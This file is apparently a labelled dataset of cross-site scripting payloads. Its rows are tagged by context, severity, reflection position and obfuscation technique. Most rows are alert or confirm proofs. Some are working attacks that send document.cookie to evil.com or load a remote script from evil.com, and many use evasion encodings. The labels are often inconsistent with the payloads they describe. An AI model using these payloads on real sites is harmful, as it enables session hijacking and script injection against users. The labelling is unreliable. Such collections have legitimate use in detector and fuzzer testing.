payload,payload_with_context,context,severity,source,sink,reflection_position,technique
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:script],event_handler,high,,,script,original
"ONeRrOR=""aLErT(1)""","ONeRrOR=""aLErT(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
<BODY ONLOAD=alert(’XSS’)>,<BODY ONLOAD=alert(’XSS’)> [position:html_body],html_body,medium,,,html_body,case_variation
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,low,,,attribute,original
<details open ontoggle=confirm(1)>,<details open ontoggle=confirm(1)> [position:style],event_handler,medium,,,style,mutated
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:html_body],attribute_escape,medium,,,html_body,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:attribute],attribute_escape,high,,,attribute,original
""" onfocus=al'+'ert(1) autofocus=""",""" onfocus=al'+'ert(1) autofocus="" [position:attribute]",js_uri,medium,,,attribute,obfuscated:concat_split
onload='alert(1)',onload='alert(1)' [position:html_body],attribute,medium,,,html_body,none
<body onload=alert(1)>,<body onload=alert(1)> [position:style],event_handler,low,,,style,original
alert(document.cookie);,alert(document.cookie); [position:attribute],attribute,medium,,,attribute,mutated
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,high,,,attribute,obfuscated:url_encode
{{7*7}},{{7*7}} [position:script],js_uri,low,,,script,obfuscated:unicode_escape
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:attribute]",attribute_escape,low,,,attribute,original
${alert(1)},${alert(1)} [position:script],template_injection,low,,,script,original
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:none],event_handler,medium,,,none,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],event_handler,medium,,,script,original
onwheel='alert(1)',onwheel='alert(1)' [position:html_body],attribute,medium,,,html_body,mutated
%3Cinput onfocus=alert(1) autofocus%3E,%3Cinput onfocus=alert(1) autofocus%3E [position:attribute],event_handler,medium,,,attribute,obfuscated:url_encode
""" oNlOaD=AlErT(1) x=""",""" oNlOaD=AlErT(1) x="" [position:attribute]",attribute,low,,,attribute,obfuscated:mixed_case
javascript:alert(1),javascript:alert(1) [position:html_body],js_uri,medium,,,html_body,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",dom_sink,low,,,script,original
\x3cimg/src=x onerror=alert(1)//\x3e,\x3cimg/src=x onerror=alert(1)//\x3e [position:attribute],attribute,medium,,,attribute,obfuscated:hex_escape
\' onerror=alert(1)//,\' onerror=alert(1)// [position:none],attribute_escape,medium,,,none,obfuscated:url_encode
javaSCRIPT:confirm(1),javaSCRIPT:confirm(1) [position:attribute],js_uri,medium,,,attribute,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:none]",attribute_escape,high,,,none,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,low,,,attribute,obfuscated:html_entity
<script>d.innerHTML+='';</script>,<script>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,none
<svg onload=alert(1)>,<svg onload=alert(1)> [position:script],event_handler,low,,,script,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:attribute]",template_injection,high,,,attribute,original
onload='prompt`1`',onload='prompt`1`' [position:html_body],html_body,medium,,,html_body,mutated
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">","<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)""> [position:html_body]",tag_injection,medium,,,html_body,obfuscated:unicode_escape
"<IfRaMe sRc=""JaVaScRiPt:aLeRt(1)"">","<IfRaMe sRc=""JaVaScRiPt:aLeRt(1)""> [position:script]",tag_injection,high,,,script,obfuscated:mixed_case
"<embed src=""javascript:al'+'ert(1)"">","<embed src=""javascript:al'+'ert(1)""> [position:script]",tag_injection,medium,,,script,obfuscated:concat_split
""" oNlOaD=AlErT(1) x=""",""" oNlOaD=AlErT(1) x="" [position:attribute]",attribute,low,,,attribute,obfuscated:mixed_case
\x3c%= alert(1) %\x3e,\x3c%= alert(1) %\x3e [position:none],template_injection,low,,,none,obfuscated:hex_escape
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,low,,,attribute,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:html_body],attribute_escape,medium,,,html_body,original
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,mutated
<%= alert(1) %>,<%= alert(1) %> [position:html_body],attribute_escape,low,,,html_body,mutated
"\"" onload=alert(1)//","\"" onload=alert(1)// [position:script]",attribute_escape,high,,,script,mutated
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],script_injection,high,,,script,mutated
&quot; onload=alert(1) x=&quot;,&quot; onload=alert(1) x=&quot; [position:script],attribute_escape,high,,,script,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:script]",dom_sink,medium,,,script,original
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:html_body],script_injection,medium,,,html_body,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:script],tag_injection,medium,,,script,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:script],script_injection,low,,,script,mutated
</tag><svg onload=alert(1)>,</tag><svg onload=alert(1)> [position:comment],attribute,medium,,,comment,none
<script>prompt(1)</script>,<script>prompt(1)</script> [position:script],dom_sink,low,,,script,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,high,,,html_body,obfuscated:unicode_escape
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,low,,,attribute,original
"""><img src=x onerror=al'+'ert(1)>","""><img src=x onerror=al'+'ert(1)> [position:attribute]",attribute,low,,,attribute,obfuscated:concat_split
<%= alert(1) %>,<%= alert(1) %> [position:style],template_injection,low,,,style,original
&lt;img src=x onerror=alert(1)&gt;,&lt;img src=x onerror=alert(1)&gt; [position:attribute],event_handler,low,,,attribute,obfuscated:html_entity
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,high,,,attribute,original
#{alert(1)},#{alert(1)} [position:html_body],template_injection,low,,,html_body,original
<script>prompt(1)</script>,<script>prompt(1)</script> [position:script],script_injection,low,,,script,original
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:script]",script_injection,high,,,script,obfuscated:url_encode
"setTimeout(""confirm(1)"",0)","setTimeout(""confirm(1)"",0) [position:script]",dom_sink,high,,,script,mutated
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,high,,,html_body,mutated
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
"\""%3E%3Cimg src=x onerror=alert(1)%3E","\""%3E%3Cimg src=x onerror=alert(1)%3E [position:script]",attribute_escape,medium,,,script,obfuscated:url_encode
' onmouseover=confirm(1) ',' onmouseover=confirm(1) ' [position:attribute],attribute,low,,,attribute,mutated
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,low,,,script,original
"<script src
=//evil.com/xss.js></script>","<script src
=//evil.com/xss.js></script> [position:html_body]",script_injection,low,,,html_body,obfuscated:tab_newline_inject
<svg/onload=confirm(1)>,<svg/onload=confirm(1)> [position:attribute],js_uri,high,,,attribute,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:script],dom_sink,medium,,,script,original
; alert(1);//,; alert(1);// [position:attribute],attribute,medium,,,attribute,none
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:attribute],event_handler,low,,,attribute,mutated
""" onerror=confirm(1) x=""",""" onerror=confirm(1) x="" [position:attribute]",attribute,low,,,attribute,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:html_body],js_uri,high,,,html_body,mutated
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:html_body]",js_uri,high,,,html_body,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:script],event_handler,high,,,script,original
javascript:alert(	document.domain),javascript:alert(	document.domain) [position:attribute],js_uri,low,,,attribute,obfuscated:tab_newline_inject
j\u0061v\u0061script:confirm(1),j\u0061v\u0061script:confirm(1) [position:none],js_uri,medium,,,none,obfuscated:unicode_escape
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:style],attribute_escape,medium,,,style,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:html_body],attribute_escape,low,,,html_body,original
"onload=""alert(document.cookie)""","onload=""alert(document.cookie)"" [position:html_body]",html_body,medium,,,html_body,mutated
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:none],dom_sink,medium,,,none,original
\' OnErRoR=AlErT(1)//,\' OnErRoR=AlErT(1)// [position:html_body],attribute_escape,medium,,,html_body,obfuscated:mixed_case
"ONLoaD=""aLErt(1)""","ONLoaD=""aLErt(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:html_body]",script_injection,medium,,,html_body,original
"\""><img src=x onerror=confirm(1)>","\""><img src=x onerror=confirm(1)> [position:attribute]",event_handler,medium,,,attribute,mutated
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""","\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)"" [position:none]",dom_sink,high,,,none,obfuscated:unicode_escape
' \x3e\x3cimg src=x onerror=alert(1)\x3e,' \x3e\x3cimg src=x onerror=alert(1)\x3e [position:attribute],attribute,low,,,attribute,obfuscated:hex_escape
<ScRiPt sRc=//eViL.CoM/XsS.Js></sCrIpT>,<ScRiPt sRc=//eViL.CoM/XsS.Js></sCrIpT> [position:script],script_injection,low,,,script,obfuscated:mixed_case
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,low,,,attribute,mutated
#{alert(1)},#{alert(1)} [position:none],template_injection,low,,,none,original
<%= al'+'ert(1) %>,<%= al'+'ert(1) %> [position:none],template_injection,high,,,none,obfuscated:concat_split
javascript:alert(document.domain),javascript:alert(document.domain) [position:script],js_uri,medium,,,script,original
javascript:confirm(1),javascript:confirm(1) [position:attribute],js_uri,high,,,attribute,obfuscated:concat_split
"<%
= alert(	1) %>","<%
= alert(	1) %> [position:style]",template_injection,medium,,,style,obfuscated:tab_newline_inject
javascript:alert(document.domain),javascript:alert(document.domain) [position:script],script_injection,high,,,script,original
"location
=""javascript:alert(	1)""","location
=""javascript:alert(	1)"" [position:script]",dom_sink,low,,,script,obfuscated:tab_newline_inject
<img/src=x onerror=al'+'ert(1)//>,<img/src=x onerror=al'+'ert(1)//> [position:html_body],js_uri,low,,,html_body,obfuscated:concat_split
<script>prompt(1)</script>,<script>prompt(1)</script> [position:script],script_injection,medium,,,script,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:style],event_handler,high,,,style,obfuscated:comment_inject
"eVaL(""aLeRt(1)"")","eVaL(""aLeRt(1)"") [position:script]",tag_injection,low,,,script,obfuscated:mixed_case
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,mutated
"<object data=""javascript:al'+'ert(1)"">","<object data=""javascript:al'+'ert(1)""> [position:script]",tag_injection,low,,,script,obfuscated:concat_split
javascript:alert(document.domain),javascript:alert(document.domain) [position:script],js_uri,medium,,,script,original
#{alert(1)},#{alert(1)} [position:style],template_injection,low,,,style,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,low,,,script,original
onerror='alert(1)',onerror='alert(1)' [position:html_body],html_body,medium,,,html_body,none
\u003cimg src onerror=confirm`1`\u003e,\u003cimg src onerror=confirm`1`\u003e [position:attribute],attribute,medium,,,attribute,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:script],js_uri,high,,,script,mutated
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,high,,,attribute,original
<body onload=alert(1)>,<body onload=alert(1)> [position:attribute],event_handler,high,,,attribute,original
javascript:confirm(1),javascript:confirm(1) [position:none],js_uri,high,,,none,original
<img src=x onerror=confirm(1)>,<img src=x onerror=confirm(1)> [position:style],event_handler,low,,,style,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:none],js_uri,medium,,,none,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:none]",event_handler,low,,,none,mutated
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:script]",dom_sink,high,,,script,original
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:attribute]",attribute_escape,medium,,,attribute,obfuscated:url_encode
<input onfocus=al'+'ert(1) autofocus>,<input onfocus=al'+'ert(1) autofocus> [position:attribute],event_handler,low,,,attribute,obfuscated:concat_split
javaSCRIPT:confirm(1),javaSCRIPT:confirm(1) [position:attribute],js_uri,low,,,attribute,mutated
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,high,,,script,mutated
"<vIdeO/><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">","<vIdeO/><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])""> [position:comment]",attribute,high,,,comment,mutated
ONLoaD='aLert(1)',ONLoaD='aLert(1)' [position:html_body],html_body,medium,,,html_body,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:html_body],script_injection,high,,,html_body,mutated
javascr/**/ipt:alert(document.domain),javascr/**/ipt:alert(document.domain) [position:style],js_uri,high,,,style,obfuscated:comment_inject
<img/src=x onerror=alert(1)//>,<img/src=x onerror=alert(1)//> [position:script],event_handler,high,,,script,original
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,<svg/on\u006co\u0061d=\u0061\u006cert(1)> [position:html_body],script_injection,medium,,,html_body,obfuscated:unicode_escape
<SCRIPT>al'+'ert(1)</SCRIPT>,<SCRIPT>al'+'ert(1)</SCRIPT> [position:script],script_injection,high,,,script,obfuscated:concat_split
<img/src/onerror=alert(1),<img/src/onerror=alert(1) [position:dom],html_body,medium,,,dom,none
<img/src=x onerror=alert(1)//>,<img/src=x onerror=alert(1)//> [position:style],event_handler,medium,,,style,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:attribute]",template_injection,low,,,attribute,original
#{alert(1)},#{alert(1)} [position:style],template_injection,low,,,style,original
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:html_body],attribute_escape,high,,,html_body,original
{{7*7}},{{7*7}} [position:style],template_injection,high,,,style,obfuscated:hex_escape
"\"" onerror=confirm(1)//","\"" onerror=confirm(1)// [position:attribute]",js_uri,medium,,,attribute,mutated
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:script]",js_uri,medium,,,script,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,high,,,script,obfuscated:html_entity
"<embed src=""javascript:al'+'ert(1)"">","<embed src=""javascript:al'+'ert(1)""> [position:html_body]",tag_injection,medium,,,html_body,obfuscated:concat_split
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:attribute],attribute_escape,high,,,attribute,mutated
javascript:confirm(1),javascript:confirm(1) [position:html_body],script_injection,low,,,html_body,mutated
<SCRIPT>confirm(1)</SCRIPT>,<SCRIPT>confirm(1)</SCRIPT> [position:script],script_injection,high,,,script,mutated
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,mutated
"//"";alert(document.domain))","//"";alert(document.domain)) [position:html_body]",html_body,high,,,html_body,mutated
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,medium,,,html_body,original
""" onerror=confirm(1) x=""",""" onerror=confirm(1) x="" [position:attribute]",attribute,high,,,attribute,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,original
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>","<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT> [position:html_body]",script_injection,high,,,html_body,mutated
{{7*7}},{{7*7}} [position:html_body],template_injection,low,,,html_body,original
"oncontextmenu=""alert(1)""","oncontextmenu=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
javascript:confirm(1),javascript:confirm(1) [position:style],js_uri,low,,,style,mutated
#{alert(1)},#{alert(1)} [position:none],template_injection,low,,,none,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:script]",tag_injection,medium,,,script,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,high,,,attribute,obfuscated:comment_inject
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:style]",js_uri,high,,,style,original
{{7*7}},{{7*7}} [position:html_body],template_injection,high,,,html_body,original
#{alert(1)},#{alert(1)} [position:script],template_injection,medium,,,script,original
javascript:alert(document.domain),javascript:alert(document.domain) [position:none],js_uri,high,,,none,original
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,medium,,,attribute,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:attribute]",js_uri,high,,,attribute,original
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,low,,,script,original
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:script]",js_uri,low,,,script,original
%3Cimg src=x onerror=alert(1)%3E,%3Cimg src=x onerror=alert(1)%3E [position:script],tag_injection,medium,,,script,obfuscated:url_encode
<math onload=alert()>,<math onload=alert()> [position:html_body],html_body,medium,,,html_body,mutated
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:script]",tag_injection,low,,,script,original
<img/src=x onerror=alert(1)//>,<img/src=x onerror=alert(1)//> [position:html_body],event_handler,medium,,,html_body,original
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,high,,,script,mutated
<marquee onstart=confirm(1)>,<marquee onstart=confirm(1)> [position:none],dom_sink,low,,,none,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:attribute]",attribute_escape,medium,,,attribute,original
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,medium,,,script,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:attribute],attribute_escape,medium,,,attribute,mutated
confirm`1`,confirm`1` [position:comment],attribute,medium,,,comment,mutated
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:script],script_injection,high,,,script,original
<%= aLeRt(1) %>,<%= aLeRt(1) %> [position:script],script_injection,high,,,script,obfuscated:mixed_case
""" onload=confirm(1) x=""",""" onload=confirm(1) x="" [position:attribute]",attribute,low,,,attribute,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:attribute],event_handler,high,,,attribute,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:style],attribute_escape,medium,,,style,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:script],event_handler,low,,,script,mutated
${alert(1)},${alert(1)} [position:html_body],template_injection,low,,,html_body,original
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,mutated
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:style],event_handler,high,,,style,original
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,low,,,script,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:script],script_injection,medium,,,script,original
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",""" on\u006co\u0061d=\u0061\u006cert(1) x="" [position:attribute]",attribute,low,,,attribute,obfuscated:unicode_escape
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:script],script_injection,medium,,,script,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:none],dom_sink,low,,,none,original
<body onload=alert(1)>,<body onload=alert(1)> [position:html_body],tag_injection,low,,,html_body,original
<script>confirm(document.domain)</script>,<script>confirm(document.domain)</script> [position:script],script_injection,low,,,script,mutated
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:attribute],attribute,medium,,,attribute,original
<svg onload=confirm`1`>,<svg onload=confirm`1`> [position:comment],attribute,medium,,,comment,mutated
</tag><svg onload=alert(1)>,</tag><svg onload=alert(1)> [position:html_body],html_body,medium,,,html_body,none
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,high,,,script,mutated
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,high,,,html_body,original
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,medium,,,html_body,mutated
\x3cmarquee onstart=alert(1)\x3e,\x3cmarquee onstart=alert(1)\x3e [position:none],event_handler,medium,,,none,obfuscated:hex_escape
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,high,,,script,mutated
javascript:alert(1),javascript:alert(1) [position:style],js_uri,high,,,style,mutated
"\""><img src
=x onerror
=alert(	1)>","\""><img src
=x onerror
=alert(	1)> [position:attribute]",attribute_escape,medium,,,attribute,obfuscated:tab_newline_inject
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:none],event_handler,high,,,none,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,medium,,,html_body,mutated
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:html_body],js_uri,high,,,html_body,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:style],event_handler,medium,,,style,obfuscated:comment_inject
javascript:confirm(1),javascript:confirm(1) [position:attribute],js_uri,high,,,attribute,mutated
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:html_body],event_handler,medium,,,html_body,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:script],event_handler,high,,,script,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",event_handler,high,,,script,mutated
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:script],dom_sink,high,,,script,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:attribute],js_uri,low,,,attribute,mutated
%3Cimg/src=%3Dx+onload=self.alert(1)%3D,%3Cimg/src=%3Dx+onload=self.alert(1)%3D [position:attribute],attribute,medium,,,attribute,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:script],tag_injection,medium,,,script,original
<script>al'+'ert(document.domain)</script>,<script>al'+'ert(document.domain)</script> [position:html_body],script_injection,high,,,html_body,obfuscated:concat_split
javascript:alert(1),javascript:alert(1) [position:none],js_uri,high,,,none,original
<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt>,<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt> [position:html_body],script_injection,medium,,,html_body,obfuscated:comment_inject
"<iframe src=""javascript:al'+'ert(1)"">","<iframe src=""javascript:al'+'ert(1)""> [position:html_body]",tag_injection,low,,,html_body,obfuscated:concat_split
{{7*7}},{{7*7}} [position:attribute],js_uri,medium,,,attribute,mutated
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,medium,,,script,original
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,medium,,,script,original
<iframe/onload=alert(0);>,<iframe/onload=alert(0);> [position:html_body],html_body,medium,,,html_body,none
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,low,,,attribute,mutated
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">","<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)""> [position:script]",tag_injection,high,,,script,obfuscated:unicode_escape
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,low,,,script,mutated
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:attribute]",attribute,high,,,attribute,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:script]",dom_sink,medium,,,script,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:attribute],event_handler,high,,,attribute,original
\x3cdetails open ontoggle=alert(1)\x3e,\x3cdetails open ontoggle=alert(1)\x3e [position:html_body],js_uri,high,,,html_body,obfuscated:hex_escape
<svg onload=alert()>,<svg onload=alert()> [position:dom],html_body,medium,,,dom,none
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],event_handler,low,,,attribute,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],tag_injection,high,,,script,original
' oNeRrOr=aLeRt(1) X=',' oNeRrOr=aLeRt(1) X=' [position:script],dom_sink,medium,,,script,obfuscated:mixed_case
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,medium,,,script,original
&lt;marquee onstart=alert(1)&gt;,&lt;marquee onstart=alert(1)&gt; [position:script],event_handler,high,,,script,obfuscated:html_entity
"\""&gt;&lt;img src=x onerror=alert(1)&gt;","\""&gt;&lt;img src=x onerror=alert(1)&gt; [position:script]",dom_sink,medium,,,script,obfuscated:html_entity
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,mutated
""" onfocus=\u0061\u006cert(1) \u0061utofocus=""",""" onfocus=\u0061\u006cert(1) \u0061utofocus="" [position:attribute]",attribute,medium,,,attribute,obfuscated:unicode_escape
${alert(1)},${alert(1)} [position:script],event_handler,medium,,,script,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:style]",js_uri,high,,,style,original
"""><svg src=x onerror=alert(1)>","""><svg src=x onerror=alert(1)> [position:attribute]",attribute,high,,,attribute,mutated
&quot; onerror=confirm(1) x=&quot;,&quot; onerror=confirm(1) x=&quot; [position:attribute],js_uri,medium,,,attribute,mutated
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,original
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:style]",attribute_escape,high,,,style,mutated
<SvG oNLoAD=AleRt()>,<SvG oNLoAD=AleRt()> [position:html_body],html_body,medium,,,html_body,mutated
<svg src=x onerror=alert(1)>,<svg src=x onerror=alert(1)> [position:script],tag_injection,medium,,,script,mutated
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,low,,,html_body,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:script],script_injection,high,,,script,original
"<embed src
=""javascript:alert(	1)"">","<embed src
=""javascript:alert(	1)""> [position:html_body]",tag_injection,low,,,html_body,obfuscated:tab_newline_inject
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:script]",script_injection,high,,,script,original
onload='alert(1)',onload='alert(1)' [position:html_body],html_body,medium,,,html_body,none
